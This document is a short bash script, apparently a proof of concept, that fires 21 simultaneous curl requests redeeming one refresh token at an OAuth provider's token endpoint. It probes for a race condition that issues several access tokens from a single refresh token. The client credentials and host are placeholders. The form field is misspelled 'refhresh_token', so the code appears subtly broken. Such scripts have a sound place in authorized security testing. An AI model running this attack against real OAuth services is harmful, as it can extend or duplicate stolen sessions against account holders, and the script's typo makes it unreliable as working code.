#!/bin/bash
for i in {0..20}
do
 curl --data "refhresh_token=$1&client_id=CLIENT_ID&client_secret=CLIENT_SECRET&redirect_uri=CALLBACK_URL&grant_type=refresh_token" "https://OAUTH_PROVIDER/oauth/token" &
done
# where $1 is refresh_token value (first parameter passed to the script)
